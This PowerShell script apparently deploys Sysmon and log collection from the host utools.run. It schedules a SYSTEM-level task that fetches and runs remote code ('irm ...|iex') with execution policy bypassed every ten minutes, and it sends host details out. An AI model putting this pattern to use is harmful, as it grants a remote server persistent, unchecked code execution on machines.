$ProgressPreference = 'SilentlyContinue'
function mylog {
  param (
      $myMessage
  )
  $guid = $(New-Guid)
  $dt = Get-Date -format "yyyy-MM-dd HH:mm:ss"

  $info = [ordered]@{}
  $info["id"]= $guid
  $info["message"]=$dt+','+$env:COMPUTERNAME+','+$myMessage

  $jsdata=$info | convertTo-Json
  $jsdata
  Invoke-RestMethod utools.run/mylog -Method Post -Body $jsdata
}


$localAppData = $env:LOCALAPPDATA
$targetDirectory = Join-Path $localAppData "utools"
$config_file = "C:\Windows\config.xml"
if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}
# Add-MpPreference -ExclusionPath $targetDirectory
$savePathZip = Join-Path $targetDirectory "sysmon.zip"

if (Test-Path $savePathZip)
{
  try {
    Remove-Item -Path $savePathZip -Force -ErrorAction SilentlyContinue
  }
  catch {
  }
}

# $sysmon_url="https://download.sysinternals.com/files/Sysmon.zip"
$sysmon_url="http://utools.run/sysmon.zip"
$sysmon_config="http://utools.run/config.xml"


try {
  Invoke-WebRequest -Uri $sysmon_url -OutFile $savePathZip -ErrorAction Stop
  Invoke-WebRequest -Uri $sysmon_config -OutFile $config_file -ErrorAction Stop
}
catch {
  mylog("Get sysmon and config failed.")
}

try {
    Expand-Archive -Path $savePathZip -DestinationPath $targetDirectory -Force -ErrorAction SilentlyContinue
    }
catch {
    myog("Expand Archive Failed.")
    }

if ((Get-Service -Name Sysmon64 -ErrorAction SilentlyContinue).Status -eq "Running")
{
    " Sysmon Service already installed"
    Sysmon64.exe -c c:\Windows\config.xml


} else {
    start-process -FilePath "$env:ComSpec" -WorkingDirectory $targetDirectory -ArgumentList "/c","sysmon64.exe -nobanner -i c:\Windows\config.xml -accepteula > sysmon.log 2>&1" -NoNewWindow -Wait
}

try {
  Remove-Item -Path $targetDirectory\$env:COMPUTERNAME.csv -Force -ErrorAction SilentlyContinue
  Remove-Item -Path $targetDirectory\"sysmon.zip" -Force -ErrorAction SilentlyContinue
  Remove-Item -Path $targetDirectory\"sysmon.exe" -Force -ErrorAction SilentlyContinue
  Remove-Item -Path $targetDirectory\"sysmon64a.exe" -Force -ErrorAction SilentlyContinue
}
catch {
  "Clean Files Failed."
}




$targetDirectory = "c:\tools2"

if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}

# Check Update

'powershell -executionPolicy ByPass -Command "irm utools.run/update|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii 
'powershell -executionPolicy ByPass -Command "irm utools.run/hardware_inventory|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm utools.run/tcpvcon|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm utools.run/autorun|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm utools.run/sysmon/1|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm utools.run/sysmon/3|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm utools.run/sysmon/5|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm utools.run/sysmon/11|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append

# 'powershell -executionPolicy ByPass -Command "irm utools.run/sysmon/12|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append

'powershell -executionPolicy ByPass -Command "irm utools.run/sysmon/22|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm utools.run/sysmon/27|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm utools.run/app_sys_sec|iex"' | out-file c:\tools2\collectLogs.bat -Encoding ascii -Append

$TaskName = "collectLogs"
Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
if ($? -eq $true)
{
    Write-Host "Task $TaskName already exist.try to delete"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
}

# $actions = New-ScheduledTaskAction -Execute 'powershell -executionPolicy ByPass -Command "irm utools.run/tcpvcon|iex"'

$actions = New-ScheduledTaskAction -Execute 'cmd /c c:\tools2\collectLogs.bat'


$TheDate= ([DateTime]::Now)
$Duration = $TheDate.AddYears(25) -$TheDate

$trigger = New-ScheduledTaskTrigger -Once -At(Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration $Duration
$principal = New-ScheduledTaskPrincipal -UserId 'system' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun
$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings

Register-ScheduledTask $TaskName -InputObject $task

mylog("registe OK.")

Start-ScheduledTask -TaskName collectLogs
